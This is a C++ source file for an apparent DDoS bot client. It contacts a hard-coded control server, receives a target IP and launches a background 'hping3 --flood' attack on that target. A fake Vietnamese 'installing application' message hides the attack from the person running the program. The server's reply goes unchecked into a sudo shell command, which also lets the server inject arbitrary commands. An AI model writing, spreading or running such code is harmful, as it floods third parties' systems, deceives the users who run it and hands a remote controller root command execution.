#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <cstdlib>

using namespace std;

int main() 
{
    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == -1) 
    {
        cerr << "Error creating socket!" << endl;
        return -1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(45444);
    inet_pton(AF_INET, "192.168.2.132", &serverAddr.sin_addr); 

    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) 
    {
        cerr << "Vui long thu lai!" << endl;
        return -1;
    }

    string request = "terminal";
    send(clientSocket, request.c_str(), request.size(), 0);

    char buffer[4096];
    memset(buffer, 0, 4096);
    int bytesReceived = recv(clientSocket, buffer, 4096, 0);
    if (bytesReceived > 0) 
    {
	system("clear");
        cout << "Dang cai dat ung dung..." << endl;
        string serverResponse(buffer, bytesReceived);
    	// cout << "Server response: " << serverResponse << endl;

    size_t pos = serverResponse.find("on ");
    if (pos != string::npos) {
        string targetIP = serverResponse.substr(pos + 3); 
        
        // cout << "Running hping3 on client with IP: " << targetIP << endl;
        string hpingCommand = "sudo hping3 " + targetIP + " --flood -p 80 > /dev/null 2>&1 &";
        // string hpingCommand = "sudo hping3 -1 " + targetIP + " --flood -p 80 > /dev/null 2>&1 &";
        system(hpingCommand.c_str());
    }
    }

    close(clientSocket);
    return 0;
}
